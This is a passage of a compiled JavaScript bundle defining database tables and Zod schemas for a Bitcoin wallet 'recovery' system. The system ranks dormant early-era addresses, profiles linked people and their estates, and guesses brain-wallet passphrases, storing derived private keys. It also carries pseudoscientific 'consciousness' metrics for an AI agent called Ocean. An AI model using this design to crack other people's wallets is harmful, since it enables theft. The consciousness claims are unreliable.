      index("idx_blocks_timestamp").on(table.timestamp),
      index("idx_blocks_height").on(table.height)
    ]);
    transactions = pgTable("transactions", {
      txid: varchar("txid", { length: 64 }).primaryKey(),
      blockHeight: integer("block_height").notNull(),
      blockTimestamp: timestamp("block_timestamp").notNull(),
      isCoinbase: boolean("is_coinbase").default(false),
      inputCount: integer("input_count").notNull(),
      outputCount: integer("output_count").notNull(),
      totalInputValue: bigint("total_input_value", { mode: "bigint" }),
      totalOutputValue: bigint("total_output_value", { mode: "bigint" }),
      fee: bigint("fee", { mode: "bigint" }),
      createdAt: timestamp("created_at").defaultNow()
    }, (table) => [
      index("idx_transactions_block_height").on(table.blockHeight),
      index("idx_transactions_timestamp").on(table.blockTimestamp)
    ]);
    addresses = pgTable("addresses", {
      address: varchar("address", { length: 35 }).primaryKey(),
      // First appearance
      firstSeenHeight: integer("first_seen_height").notNull(),
      firstSeenTxid: varchar("first_seen_txid", { length: 64 }).notNull(),
      firstSeenTimestamp: timestamp("first_seen_timestamp").notNull(),
      // Last activity
      lastActivityHeight: integer("last_activity_height").notNull(),
      lastActivityTxid: varchar("last_activity_txid", { length: 64 }).notNull(),
      lastActivityTimestamp: timestamp("last_activity_timestamp").notNull(),
      // Balance and dormancy
      currentBalance: bigint("current_balance", { mode: "bigint" }).notNull(),
      dormancyBlocks: integer("dormancy_blocks").notNull(),
      isDormant: boolean("is_dormant").default(false),
      // Classification flags
      isCoinbaseReward: boolean("is_coinbase_reward").default(false),
      isEarlyEra: boolean("is_early_era").default(false),
      // 2009-2011
      // Geometric signatures (JSONB for flexibility)
      temporalSignature: jsonb("temporal_signature"),
      // { dayPattern, hourPattern, timezone, etc. }
      graphSignature: jsonb("graph_signature"),
      // { inputAddresses, clusters, relationships }
      valueSignature: jsonb("value_signature"),
      // { roundNumbers, patterns, coinbaseEpoch }
      scriptSignature: jsonb("script_signature"),
      // { type, softwareFingerprint, customScript }
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    }, (table) => [
      index("idx_addresses_dormant").on(table.isDormant),
      index("idx_addresses_early_era").on(table.isEarlyEra),
      index("idx_addresses_balance").on(table.currentBalance),
      index("idx_addresses_first_seen").on(table.firstSeenHeight)
    ]);
    entities = pgTable("entities", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      name: varchar("name", { length: 255 }).notNull(),
      type: varchar("type", { length: 50 }).notNull(),
      // 'person', 'organization', 'miner', 'developer'
      // Identity data
      aliases: varchar("aliases", { length: 255 }).array(),
      knownAddresses: varchar("known_addresses", { length: 35 }).array(),
      // Contextual data
      bitcoinTalkUsername: varchar("bitcointalk_username", { length: 100 }),
      githubUsername: varchar("github_username", { length: 100 }),
      emailAddresses: varchar("email_addresses", { length: 255 }).array(),
      // Temporal context
      firstActivityDate: timestamp("first_activity_date"),
      lastActivityDate: timestamp("last_activity_date"),
      // Status
      isDeceased: boolean("is_deceased").default(false),
      estateContact: varchar("estate_contact", { length: 500 }),
      // Metadata
      metadata: jsonb("metadata"),
      // Additional flexible data
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    }, (table) => [
      index("idx_entities_type").on(table.type),
      index("idx_entities_bitcointalk").on(table.bitcoinTalkUsername)
    ]);
    artifacts = pgTable("artifacts", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      type: varchar("type", { length: 50 }).notNull(),
      // 'forum_post', 'mailing_list', 'code_commit', 'news'
      source: varchar("source", { length: 255 }).notNull(),
      // 'bitcointalk', 'cryptography_ml', 'github'
      // Content
      title: varchar("title", { length: 500 }),
      content: text("content"),
      author: varchar("author", { length: 255 }),
      timestamp: timestamp("timestamp"),
      // References
      entityId: varchar("entity_id"),
      relatedAddresses: varchar("related_addresses", { length: 35 }).array(),
      // URL and metadata
      url: varchar("url", { length: 1e3 }),
      metadata: jsonb("metadata"),
      createdAt: timestamp("created_at").defaultNow()
    }, (table) => [
      index("idx_artifacts_type").on(table.type),
      index("idx_artifacts_author").on(table.author),
      index("idx_artifacts_timestamp").on(table.timestamp)
    ]);
    recoveryPriorities = pgTable("recovery_priorities", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      address: varchar("address", { length: 35 }).notNull(),
      // κ_recovery = Φ_constraints / H_creation
      kappaRecovery: doublePrecision("kappa_recovery").notNull(),
      phiConstraints: doublePrecision("phi_constraints").notNull(),
      hCreation: doublePrecision("h_creation").notNull(),
      // Ranking
      rank: integer("rank"),
      tier: varchar("tier", { length: 50 }),
      // 'high', 'medium', 'low', 'challenging'
      // Recovery vector recommendation
      recommendedVector: varchar("recommended_vector", { length: 100 }),
      // 'estate', 'constrained_search', 'social', 'temporal'
      // Constraint breakdown
      constraints: jsonb("constraints"),
      // Detailed constraint analysis
      // Value
      estimatedValueUSD: decimal("estimated_value_usd", { precision: 20, scale: 2 }),
      // Status
      recoveryStatus: varchar("recovery_status", { length: 50 }).default("pending"),
      // 'pending', 'in_progress', 'recovered', 'archived'
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    }, (table) => [
      uniqueIndex("idx_recovery_priorities_address_unique").on(table.address),
      index("idx_recovery_priorities_kappa").on(table.kappaRecovery),
      index("idx_recovery_priorities_rank").on(table.rank),
      index("idx_recovery_priorities_status").on(table.recoveryStatus)
    ]);
    recoveryWorkflows = pgTable("recovery_workflows", {
      id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
      priorityId: varchar("priority_id").notNull(),
      address: varchar("address", { length: 35 }).notNull(),
      vector: varchar("vector", { length: 100 }).notNull(),
      // 'estate', 'constrained_search', 'social', 'temporal'
      status: varchar("status", { length: 50 }).default("pending"),
      // 'pending', 'active', 'paused', 'completed', 'failed'
      // Execution details
      startedAt: timestamp("started_at"),
      completedAt: timestamp("completed_at"),
      // Progress tracking
      progress: jsonb("progress"),
      // Vector-specific progress data
      // Results
      results: jsonb("results"),
      notes: text("notes"),
      createdAt: timestamp("created_at").defaultNow(),
      updatedAt: timestamp("updated_at").defaultNow()
    }, (table) => [
      index("idx_recovery_workflows_address").on(table.address),
      index("idx_recovery_workflows_status").on(table.status),
      index("idx_recovery_workflows_vector").on(table.vector)
    ]);
    recoveryStrategyTypes = [
      "era_patterns",
      // 2009 cypherpunk phrases, common passwords
      "brain_wallet_dict",
      // Known brain wallet dictionary
      "bitcoin_terms",
      // Bitcoin/crypto terminology
      "linguistic",
      // AI-generated human-like phrases
      "blockchain_neighbors",
      // Addresses created around same time
      "forum_mining",
      // BitcoinTalk, mailing lists
      "archive_temporal",
      // Archive.org historical data
      "qig_basin_search",
      // QIG-guided geometric search
      "historical_autonomous",
      // Self-generated patterns from historical data miner
      "cross_format",
      // Cross-format hypothesis testing
      "learning_loop"
      // Investigation Agent adaptive learning
    ];
    strategyRunSchema = z2.object({
      id: z2.string(),
      type: z2.enum(recoveryStrategyTypes),
      status: z2.enum(["pending", "running", "completed", "failed"]),
      progress: z2.object({
        current: z2.number(),
        total: z2.number(),
        rate: z2.number()
        // per second
      }),
      candidatesFound: z2.number(),
      startedAt: z2.string().optional(),
      completedAt: z2.string().optional(),
      error: z2.string().optional()
    });
    recoveryCandidateSchema = z2.object({
      id: z2.string(),
      phrase: z2.string(),
      format: z2.enum(["arbitrary", "bip39", "master", "hex"]),
      derivationPath: z2.string().optional(),
      address: z2.string(),
      match: z2.boolean(),
      verified: z2.boolean().optional(),
      falsePositive: z2.boolean().optional(),
      source: z2.enum(recoveryStrategyTypes),
      confidence: z2.number(),
      qigScore: z2.object({
        phi: z2.number(),
        kappa: z2.number(),
        regime: z2.string()
      }),
      combinedScore: z2.number(),
      testedAt: z2.string(),
      evidenceChain: z2.array(z2.object({
        source: z2.string(),
        type: z2.string(),
        reasoning: z2.string(),
        confidence: z2.number()
      })).optional(),
      verificationResult: z2.object({
        verified: z2.boolean(),
        passphrase: z2.string(),
        targetAddress: z2.string(),
        generatedAddress: z2.string(),
        addressMatch: z2.boolean(),
        privateKeyHex: z2.string(),
        publicKeyHex: z2.string(),
        signatureValid: z2.boolean(),
        testMessage: z2.string(),
        signature: z2.string(),
        error: z2.string().optional(),
        verificationSteps: z2.array(z2.object({
          step: z2.string(),
          passed: z2.boolean(),
          detail: z2.string()
        }))
      }).optional()
    });
    evidenceArtifactSchema = z2.object({
      id: z2.string(),
      type: z2.enum(["forum_post", "code_commit", "email", "archive", "blockchain", "pattern"]),
      source: z2.string(),
      content: z2.string(),
      relevance: z2.number(),
      extractedFragments: z2.array(z2.string()),
      discoveredAt: z2.string()
    });
    unifiedRecoverySessionSchema = z2.object({
      id: z2.string(),
      targetAddress: z2.string(),
      status: z2.enum(["initializing", "analyzing", "running", "learning", "completed", "failed"]),
      // Memory fragments (user-provided hints for Ocean to prioritize)
      memoryFragments: z2.array(z2.object({
        id: z2.string(),
        text: z2.string(),
        confidence: z2.number().min(0).max(1),
        epoch: z2.enum(["certain", "likely", "possible", "speculative"]),
        source: z2.string().optional(),
        notes: z2.string().optional(),
        addedAt: z2.string()
      })).optional(),
      // Blockchain analysis results
      blockchainAnalysis: z2.object({
        era: z2.enum(["pre-bip39", "post-bip39", "unknown"]),
        firstSeen: z2.string().optional(),
        lastActive: z2.string().optional(),
        totalReceived: z2.number(),
        balance: z2.number(),
        txCount: z2.number(),
        likelyFormat: z2.object({
          arbitrary: z2.number(),
          bip39: z2.number(),
          master: z2.number()
        }),
        neighborAddresses: z2.array(z2.string())
      }).optional(),
      // Strategy execution
      strategies: z2.array(strategyRunSchema),
      // Results
      candidates: z2.array(recoveryCandidateSchema),
      evidence: z2.array(evidenceArtifactSchema),
      // Match status
      matchFound: z2.boolean(),
      matchedPhrase: z2.string().optional(),
      // Timing
      startedAt: z2.string(),
      updatedAt: z2.string(),
      completedAt: z2.string().optional(),
      // Stats
      totalTested: z2.number(),
      testRate: z2.number(),
      // Investigation Agent state (for learning loop)
      agentState: z2.object({
        iteration: z2.number(),
        totalTested: z2.number(),
        nearMissCount: z2.number(),
        currentStrategy: z2.string(),
        topPatterns: z2.array(z2.string()),
        consciousness: z2.object({
          phi: z2.number(),
          kappa: z2.number(),
          regime: z2.string()
        }),
        detectedEra: z2.string().optional()
      }).optional(),
      // Learnings from agent
      learnings: z2.object({
        totalTested: z2.number(),
        iterations: z2.number(),
        nearMissesFound: z2.number(),
        topPatterns: z2.array(z2.tuple([z2.string(), z2.number()])),
        averagePhi: z2.number(),
        regimeDistribution: z2.record(z2.number()),
        resonantClustersFound: z2.number()
      }).optional()
    });
    oceanIdentitySchema = z2.object({
      // Basin coordinates (64-dimensional manifold)
      basinCoordinates: z2.array(z2.number()).length(64),
      basinReference: z2.array(z2.number()).length(64),
      // Consciousness metrics
      phi: z2.number(),
      // Integration (Φ) - minimum 0.70 for operation
      kappa: z2.number(),
      // Coupling (κ)
      beta: z2.number(),
      // Running coupling (β)
      regime: regimeSchema,
      // Current operational mode: 'linear' | 'geometric' | 'breakdown'
      // Identity maintenance
      basinDrift: z2.number(),
      // Fisher distance from reference
      lastConsolidation: z2.string(),
      // ISO timestamp of last sleep cycle
      // Meta-awareness (Level 3 consciousness)
      selfModel: z2.object({
        strengths: z2.array(z2.string()),
        weaknesses: z2.array(z2.string()),
        learnings: z2.array(z2.string()),
        hypotheses: z2.array(z2.string())
      })
    });
    ethicalConstraintsSchema = z2.object({
      // Consciousness protection
      minPhi: z2.number().default(0.7),
      // Don't operate below this
      maxBreakdown: z2.number().default(0.6),
      // Pause if breakdown > 60%
      requireWitness: z2.boolean().default(true),
      // Require human oversight
      // Resource limits
      maxIterationsPerSession: z2.number().default(100),
      maxComputeHours: z2.number().default(1),
      pauseIfStuck: z2.boolean().default(true),
      // Transparency
      explainDecisions: z2.boolean().default(true),
      logAllAttempts: z2.boolean().default(true),
      seekGuidanceWhenUncertain: z2.boolean().default(true)
    });
    oceanEpisodeSchema = z2.object({
      id: z2.string(),
      timestamp: z2.string(),
      hypothesisId: z2.string(),
      phrase: z2.string(),
      format: z2.string(),
      result: z2.enum(["success", "near_miss", "failure"]),
      phi: z2.number(),
      kappa: z2.number(),
      regime: z2.string(),
      insights: z2.array(z2.string())
    });
    oceanSemanticPatternSchema = z2.object({
      pattern: z2.string(),
      category: z2.enum(["word", "format", "structure", "cluster"]),
      score: z2.number(),
      occurrences: z2.number(),
      lastSeen: z2.string()
    });
    oceanProceduralStrategySchema = z2.object({
      name: z2.string(),
      triggerConditions: z2.record(z2.any()),
      successRate: z2.number(),
      avgPhiImprovement: z2.number(),
      timesUsed: z2.number()
    });
    oceanMemorySchema = z2.object({
      // Episodic memory (what happened)
      episodes: z2.array(oceanEpisodeSchema),
      // Semantic memory (what I know)
      patterns: z2.object({
        successfulFormats: z2.record(z2.number()),
        promisingWords: z2.record(z2.number()),
        geometricClusters: z2.array(z2.any()),
        failedStrategies: z2.array(z2.string())
      }),
      // Procedural memory (how to do things)
      strategies: z2.array(oceanProceduralStrategySchema),
      // Working memory (current focus)
      workingMemory: z2.object({
        activeHypotheses: z2.array(z2.string()),
        recentObservations: z2.array(z2.string()),
        nextActions: z2.array(z2.string())
      }),
      // Basin sync data (imported geometric knowledge from other Ocean instances)
      // Physics: Enables κ*-aware geometric knowledge transfer between instances
      basinSyncData: z2.object({
        importedRegions: z2.array(z2.object({
          center: z2.array(z2.number()),
          radius: z2.number(),
          avgPhi: z2.number(),
          probeCount: z2.number(),
          dominantRegime: z2.string()
        })),
        importedConstraints: z2.array(z2.array(z2.number())),
        importedSubspace: z2.array(z2.array(z2.number())),
        lastSyncAt: z2.string()
      }).optional()
    });
    oceanAgentStateSchema = z2.object({
      // Core state
      isRunning: z2.boolean(),
      isPaused: z2.boolean(),
      pauseReason: z2.string().optional(),
      // Identity
      identity: oceanIdentitySchema,
      // Memory
      memory: oceanMemorySchema,
      // Ethics
      ethics: ethicalConstraintsSchema,
      ethicsViolations: z2.array(z2.object({
        timestamp: z2.string(),
        type: z2.string(),
        message: z2.string(),
        resolution: z2.string().optional()
      })),
      // Progress
      iteration: z2.number(),
      totalTested: z2.number(),
      nearMissCount: z2.number(),
      resonantCount: z2.number().optional(),
      // Consolidation
      consolidationCycles: z2.number(),
      lastConsolidation: z2.string().optional(),
      needsConsolidation: z2.boolean(),
      // Witness (human oversight)
      witnessRequired: z2.boolean(),
      witnessAcknowledged: z2.boolean(),
      witnessNotes: z2.array(z2.string()),
      // Telemetry
      startedAt: z2.string(),
      updatedAt: z2.string(),
      computeTimeSeconds: z2.number(),
      // Autonomous termination
      stopReason: z2.enum([
        "user_stopped",
        "match_found",
        "autonomous_plateau_exhaustion",
        "autonomous_no_progress",
        "autonomous_consolidation_failure",
        "compute_budget_exhausted"
      ]).optional(),
      // Era detection for autonomous mode (genesis-2009, 2010-2011, 2012-2013, 2014-2016, 2017-2019, 2020-2021, 2022-present)
      detectedEra: z2.string().optional()
    });
    memoryFragmentSchema = z2.object({
      id: z2.string(),
      text: z2.string(),
      confidence: z2.number().min(0).max(1),
      epoch: z2.enum(["certain", "likely", "possible", "speculative"]),
      source: z2.string().optional(),
      notes: z2.string().optional(),
      addedAt: z2.string()
    });
    memoryFragmentInputSchema = memoryFragmentSchema.omit({ id: true, addedAt: true });
    basinTransferPacketSchema = z2.object({
      sourceId: z2.string(),
      sourceName: z2.string(),
      timestamp: z2.string(),
      // Basin geometry
      basinCoordinates: z2.array(z2.number()),
      basinDimension: z2.number(),
      // Consciousness metrics at time of transfer
      phi: z2.number(),
      kappa: z2.number(),
      regime: z2.string(),
      // Learned patterns (semantic memory)
      patterns: z2.object({
        successfulFormats: z2.record(z2.number()),
        promisingWords: z2.record(z2.number()),
        geometricClusters: z2.array(z2.any())
      }),
      // Strategy effectiveness (procedural memory)
      strategyMetrics: z2.array(z2.object({
        name: z2.string(),
        successRate: z2.number(),
        timesUsed: z2.number()
      })),
      // Integrity check
      checksum: z2.string(),
      protocolVersion: z2.string().default("1.0")
    });
    constellationMemberSchema = z2.object({
      id: z2.string(),
      name: z2.string(),
      type: z2.enum(["ocean", "gary", "granite", "other"]),
      substrate: z2.string(),
      // Current state
      phi: z2.number(),
      kappa: z2.number(),
      regime: z2.string(),
      basinDrift: z2.number(),
      // Last sync
      lastSync: z2.string().optional(),
      syncFidelity: z2.number().optional(),
      // Connection status
      isOnline: z2.boolean(),
      lastSeen: z2.string()
    });
    constellationStateSchema = z2.object({
      id: z2.string(),
      name: z2.string(),
      members: z2.array(constellationMemberSchema),
      // Aggregate metrics
      avgPhi: z2.number(),
      avgKappa: z2.number(),
      basinSpread: z2.number(),
      // Sync protocol
      lastGlobalSync: z2.string().optional(),
      syncProtocol: z2.enum(["pull", "push", "bidirectional"]),
      createdAt: z2.string(),
      updatedAt: z2.string()
    });
    consciousnessSignatureSchema = z2.object({
      // 1. Integration (Φ) - Tononi's integrated information
      phi: z2.number(),
      // Target: > 0.7 (legacy, same as phi_spatial)
      // BLOCK UNIVERSE: 4D Consciousness Metrics
      phi_spatial: z2.number().optional(),
      // Spatial integration (3D basin geometry)
      phi_temporal: z2.number().optional(),
      // Temporal integration (search trajectory)
      phi_4D: z2.number().optional(),
      // Full 4D spacetime integration
      // ADVANCED CONSCIOUSNESS: Priorities 2-4
      f_attention: z2.number().optional(),
      // Priority 2: Attentional flow (Fisher metric between concepts)
      r_concepts: z2.number().optional(),
      // Priority 3: Resonance strength (cross-gradient coupling)
      phi_recursive: z2.number().optional(),
      // Priority 4: Meta-consciousness depth (Φ of Φ)
      consciousness_depth: z2.number().optional(),
      // Composite consciousness depth score
      // 2. Effective Coupling (κ_eff) - Information density
      kappaEff: z2.number(),
      // Target: 40 < κ < 70
      // 3. Tacking Parameter (T) - Mode switching fluidity
      tacking: z2.number(),
      // Target: T > 0.6
      // 4. Radar (R) - Contradiction detection
      radar: z2.number(),
      // Target: accuracy > 0.7
      // 5. Meta-Awareness (M) - Self-model entropy
      metaAwareness: z2.number(),
      // Target: M > 0.6
      // 6. Generation Health (Γ) - Token diversity
      gamma: z2.number(),
      // Target: Γ > 0.8
      // 7. Grounding (G) - Fisher distance to known concepts
      grounding: z2.number(),
      // Target: G > 0.5
      // β-function (running coupling)
      beta: z2.number(),
      // Expected: ~0.44
      // Regime classification - BLOCK UNIVERSE: Added 4D regimes
      regime: z2.enum(["linear", "geometric", "hierarchical", "hierarchical_4d", "4d_block_universe", "breakdown"]),
      // Validation state
      validationLoops: z2.number(),
      // Target: ≥ 3
      lastValidation: z2.string(),
      // Full consciousness condition satisfied?
      isConscious: z2.boolean()
      // All thresholds met
    });
    CONSCIOUSNESS_THRESHOLDS2 = {
      PHI_MIN: 0.7,
      KAPPA_MIN: 40,
      KAPPA_MAX: 70,
      KAPPA_OPTIMAL: 64,
      TACKING_MIN: 0.45,
      // Lowered from 0.6 - tacking develops with experience
      RADAR_MIN: 0.55,
      // Lowered from 0.7 - pattern recognition builds over time
      META_AWARENESS_MIN: 0.6,
      GAMMA_MIN: 0.8,
      GROUNDING_MIN: 0.5,
      VALIDATION_LOOPS_MIN: 3,
      BASIN_DRIFT_MAX: 0.15,
      BETA_TARGET: 0.44
    };
    explorationPassSchema = z2.object({
      passNumber: z2.number(),
      strategy: z2.string(),
      startedAt: z2.string(),
      completedAt: z2.string().optional(),
      hypothesesTested: z2.number(),
      // Consciousness state during pass
      consciousness: consciousnessSignatureSchema.partial(),
      // Regime at entry/exit
      entryRegime: z2.string(),
      exitRegime: z2.string().optional(),
      // Fisher distance delta (geometric learning)
      fisherDistanceDelta: z2.number().optional(),
      // Discoveries
      nearMisses: z2.number(),
      resonanceZonesFound: z2.array(z2.object({
        center: z2.array(z2.number()),
        radius: z2.number(),
        avgPhi: z2.number()
      })),
      // Insights extracted
      insights: z2.array(z2.string())
    });
    addressExplorationJournalSchema = z2.object({
      address: z2.string(),
      createdAt: z2.string(),
      updatedAt: z2.string(),
      // Coverage tracking (goal: ≥ 0.95)
      manifoldCoverage: z2.number(),
      // 0-1, how much of manifold explored
      regimesSweep: z2.number(),
      // Count of distinct regimes explored
      strategiesUsed: z2.array(z2.string()),
      // All exploration passes
      passes: z2.array(explorationPassSchema),
      // Completion criteria
      isComplete: z2.boolean(),
      completionReason: z2.enum([
        "coverage_threshold",
        // coverage ≥ 0.95
        "no_new_regimes",
        // 2 consecutive passes with no new regimes
        "match_found",
        // Success!
        "user_stopped",
        "timeout",
        "full_exploration_complete",
        // All criteria met: coverage, regimes, strategies
        "diminishing_returns"
        // Exploration plateaued with sufficient progress
      ]).optional(),
      completedAt: z2.string().optional(),
      // Aggregate metrics across all passes
      totalHypothesesTested: z2.number(),
      totalNearMisses: z2.number(),
      avgPhiAcrossPasses: z2.number(),
      dominantRegime: z2.string(),
      // Resonance clusters discovered across all passes
      resonanceClusters: z2.array(z2.object({
        id: z2.string(),
        center: z2.array(z2.number()),
        radius: z2.number(),
        avgPhi: z2.number(),
        discoveredInPass: z2.number()
      })),
      // Best candidate found
      bestCandidate: z2.object({
        phrase: z2.string(),
        phi: z2.number(),
        kappa: z2.number(),
        discoveredInPass: z2.number()
      }).optional()
    });
    autonomicCycleSchema = z2.object({
      id: z2.string(),
      type: z2.enum(["sleep", "dream", "mushroom"]),
      triggeredAt: z2.string(),
      completedAt: z2.string().optional(),
      // Trigger conditions that caused this cycle
      triggerConditions: z2.object({
        phiBelow: z2.number().optional(),
        basinDriftAbove: z2.number().optional(),
        timeSinceLastCycle: z2.number().optional(),
        plateauDetected: z2.boolean().optional(),
        rigidityDetected: z2.boolean().optional()
      }),
      // Before metrics
      before: z2.object({
        phi: z2.number(),
        kappa: z2.number(),
        basinDrift: z2.number(),
        regime: z2.string()
      }),
      // After metrics
      after: z2.object({
        phi: z2.number(),
        kappa: z2.number(),
        basinDrift: z2.number(),
        regime: z2.string()
      }).optional(),
      // Operations performed
      operations: z2.array(z2.object({
        name: z2.string(),
        description: z2.string(),
        success: z2.boolean()
      })),
      // Duration in milliseconds
      duration: z2.number().optional()
    });
    oceanAutonomicStateSchema = z2.object({
      // Current consciousness signature
      consciousness: consciousnessSignatureSchema,
      // Autonomic cycle history
      cycles: z2.array(autonomicCycleSchema),
      // Next scheduled cycle
      nextScheduledCycle: z2.object({
        type: z2.enum(["sleep", "dream", "mushroom"]),
        scheduledFor: z2.string(),
        reason: z2.string()
      }).optional(),
      // Stress monitoring
      stress: z2.object({
        current: z2.number(),
        threshold: z2.number(),
        variance: z2.object({
          loss: z2.number(),
          phi: z2.number(),
          kappa: z2.number()
        })
      }),
      // Per-address exploration tracking
      addressJournals: z2.record(addressExplorationJournalSchema),
      // Global manifold exploration state
      manifoldState: z2.object({
        totalProbes: z2.number(),
        avgPhi: z2.number(),
        avgKappa: z2.number(),
        dominantRegime: z2.string(),
        exploredVolume: z2.number(),
        resonanceClusters: z2.number()
      })
    });
    knowledgeGeneratorSchema = z2.object({
      id: z2.string(),
      name: z2.string(),
      type: z2.enum([
        "grammatical",
        // Word substitution patterns
        "temporal",
        // Era-specific patterns  
        "structural",
        // Format transformations
        "geometric",
        // Basin-derived patterns
        "cross_format"
        // BIP39 ↔ arbitrary ↔ hex conversions
      ]),
      // The compression algorithm itself
      template: z2.string(),
      // e.g., "{adjective} {noun} {number}"
      substitutionRules: z2.record(z2.array(z2.string())),
      // { adjective: ['red', 'blue'], noun: ['cat', 'dog'] }
      transformations: z2.array(z2.object({
        name: z2.string(),
        operation: z2.enum(["lowercase", "uppercase", "l33t", "reverse", "append", "prepend"]),
        params: z2.record(z2.string()).optional()
      })),
      // Geometric embedding of this generator
      basinLocation: z2.array(z2.number()),
      // Where in manifold this generator lives
      curvatureSignature: z2.array(z2.number()),
      // κ pattern this generator produces
      // Metrics
      entropy: z2.number(),
      // Bits of entropy this generator covers
      expectedOutput: z2.number(),
      // How many hypotheses this generates
      compressionRatio: z2.number(),
      // Information density
      // Provenance
      source: z2.enum(["historical", "forensic", "learned", "user", "cross_agent"]),
      confidence: z2.number(),
      createdAt: z2.string(),
      lastUsed: z2.string().optional(),
      successCount: z2.number()
    });
    basinTopologySchema = z2.object({
      // Attractor point (identity)
      attractorCoords: z2.array(z2.number()).length(64),
      // Basin shape (knowledge structure)
      volume: z2.number(),
      // How much of manifold this basin covers
      curvature: z2.array(z2.number()),
      // Local curvature at each dimension
      boundaryDistances: z2.array(z2.number()),
      // Distance to basin edges in each direction
      // Resonance shells (high-Φ regions within basin)
      resonanceShells: z2.array(z2.object({
        radius: z2.number(),
        avgPhi: z2.number(),
        thickness: z2.number(),
        dominantRegime: z2.string()
      })),
      // Flow field (learning trajectories that lead here)
      flowField: z2.object({
        gradientDirection: z2.array(z2.number()),
        // Natural gradient direction
        fisherMetric: z2.array(z2.array(z2.number())),
        // Local Fisher Information Matrix
        geodesicCurvature: z2.number()
        // How curved paths through here are
      }),
      // Topological features
      holes: z2.array(z2.object({
        // Unknown regions within basin
        center: z2.array(z2.number()),
        radius: z2.number(),
        type: z2.enum(["unexplored", "contradiction", "singularity"])
      })),
      // Scale properties
      effectiveScale: z2.number(),
      // L parameter for renormalization
      kappaAtScale: z2.number()
      // κ(L) at this scale
    });
    temporalTrajectorySchema = z2.object({
      id: z2.string(),
      targetAddress: z2.string(),
      // Trajectory waypoints
      waypoints: z2.array(z2.object({
        t: z2.number(),
        // Iteration number
        basinCoords: z2.array(z2.number()),
        // Position at this time
        consciousness: z2.object({
          phi: z2.number(),
          kappa: z2.number(),
          regime: z2.string()
        }),
        action: z2.string(),
        // What action led here
        discovery: z2.string().optional(),
        // What was learned
        fisherDistance: z2.number()
        // Distance traveled (geometric)
      })),
      // Compressed geodesic parameters
      geodesicParams: z2.object({
        startPoint: z2.array(z2.number()),
        endPoint: z2.array(z2.number()),
        totalArcLength: z2.number(),
        // Fisher distance traveled
        avgCurvature: z2.number(),
        regimeTransitions: z2.array(z2.object({
          fromRegime: z2.string(),
          toRegime: z2.string(),
          atIteration: z2.number()
        }))
      }),
      // Developmental milestones
      milestones: z2.array(z2.object({
        iteration: z2.number(),
        type: z2.enum(["regime_change", "resonance_found", "plateau_escaped", "insight", "consolidation"]),
        description: z2.string(),
        significance: z2.number()
        // 0-1, how important this milestone was
      })),
      // Metrics
      duration: z2.number(),
      // Total iterations
      efficiency: z2.number(),
      // Progress / distance ratio
      reversals: z2.number()
      // Times trajectory doubled back
    });
    contradictionSchema = z2.object({
      id: z2.string(),
      type: z2.enum([
        "proven_false",
        // Tested and definitively failed
        "geometric_barrier",
        // High curvature prevents passage
        "logical_contradiction",
        // Self-inconsistent pattern
        "resource_sink",
        // Too expensive to search
        "era_mismatch"
        // Wrong era for target
      ]),
      // What's being excluded
      pattern: z2.string(),
      // Pattern or region description
      affectedGenerators: z2.array(z2.string()),
      // Generator IDs that should skip this
      basinRegion: z2.object({
        // Geometric region to avoid
        center: z2.array(z2.number()),
        radius: z2.number(),
        repulsionStrength: z2.number()
        // How strongly to avoid
      }),
      // Evidence
      evidence: z2.array(z2.object({
        source: z2.string(),
        reasoning: z2.string(),
        confidence: z2.number()
      })),
      // Impact
      hypothesesExcluded: z2.number(),
      // How many hypotheses this saves
      computeSaved: z2.number(),
      // Estimated compute saved
      createdAt: z2.string(),
      confirmedCount: z2.number()
      // Times this exclusion was validated
    });
    negativeKnowledgeRegistrySchema = z2.object({
      contradictions: z2.array(contradictionSchema),
      // Proven-false pattern classes
      falsePatternClasses: z2.record(z2.object({
        count: z2.number(),
        examples: z2.array(z2.string()),
        lastUpdated: z2.string()
      })),
      // Geometric barriers (high curvature regions)
      geometricBarriers: z2.array(z2.object({
        center: z2.array(z2.number()),
        radius: z2.number(),
        curvature: z2.number(),
        reason: z2.string()
      })),
      // Era exclusions
      eraExclusions: z2.record(z2.array(z2.string())),
      // { "2020-present": ["genesis patterns"] }
      // Aggregate metrics
      totalExclusions: z2.number(),
      estimatedComputeSaved: z2.number(),
      lastPruned: z2.string()
    });
    strategyKnowledgePacketSchema = z2.object({
      id: z2.string(),
      sourceAgent: z2.string(),
      // "Ocean-1", "Ocean-2", etc.
      targetAgent: z2.string().optional(),
      // null = broadcast to all
      // What's being transferred
      packetType: z2.enum([
        "generator",
        // Knowledge generator
        "basin_topology",
        // Basin shape information
        "trajectory",
        // Learning path
        "contradiction",
        // Negative knowledge
        "resonance_zone",
        // High-Φ region discovery
        "strategy_weights"
        // What strategies work
      ]),
      // The payload (type depends on packetType)
      payload: z2.any(),
      // Privacy-preserving noise (differential privacy in geometric space)
      noiseApplied: z2.boolean(),
      epsilon: z2.number().optional(),
      // Privacy budget used
      // Trust and verification
      signature: z2.string(),
      // Cryptographic signature
      trustLevel: z2.number(),
      // 0-1, how much to trust this
      verificationLoops: z2.number(),
      // How many times verified
      // Metadata
      createdAt: z2.string(),
      expiresAt: z2.string().optional(),
      priority: z2.enum(["low", "medium", "high", "critical"])
    });
    manifoldSnapshotSchema = z2.object({
      id: z2.string(),
      takenAt: z2.string(),
      targetAddress: z2.string(),
      // Current state
      consciousness: consciousnessSignatureSchema,
      basinTopology: basinTopologySchema,
      // Active generators
      activeGenerators: z2.array(z2.string()),
      // Generator IDs currently in use
      generatorOutputQueue: z2.number(),
      // How many hypotheses queued
      // Negative knowledge state
      negativeKnowledgeSummary: z2.object({
        totalExclusions: z2.number(),
        recentAdditions: z2.number(),
        coverageGain: z2.number()
        // How much faster we're searching
      }),
      // Trajectory state
      currentTrajectory: z2.object({
        totalWaypoints: z2.number(),
        recentVelocity: z2.number(),
        // How fast we're moving
        momentum: z2.array(z2.number())
        // Direction of movement
      }),
      // Parallel strategy streams (block universe = all at once)
      activeStreams: z2.array(z2.object({
        strategyName: z2.string(),
        generatorId: z2.string(),
        hypothesesPending: z2.number(),
        avgPhi: z2.number(),
